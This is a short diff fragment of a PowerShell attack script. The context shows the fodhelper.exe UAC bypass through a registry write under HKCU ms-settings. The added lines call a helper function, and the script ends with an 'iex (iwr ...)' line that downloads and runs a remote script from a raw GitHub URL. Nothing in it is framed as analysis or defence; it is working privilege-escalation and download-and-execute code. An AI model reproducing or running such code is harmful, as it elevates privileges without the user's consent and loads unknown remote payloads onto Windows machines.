@@ -15,5 +15,6 @@ Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -
  
 #Bypass Execution
 Start-Process "C:\Windows\System32\fodhelper.exe"
-}
+};
+helper;
 iex (iwr https://raw.githubusercontent.com/billhemmer2789/food/main/cocoa.ps1)
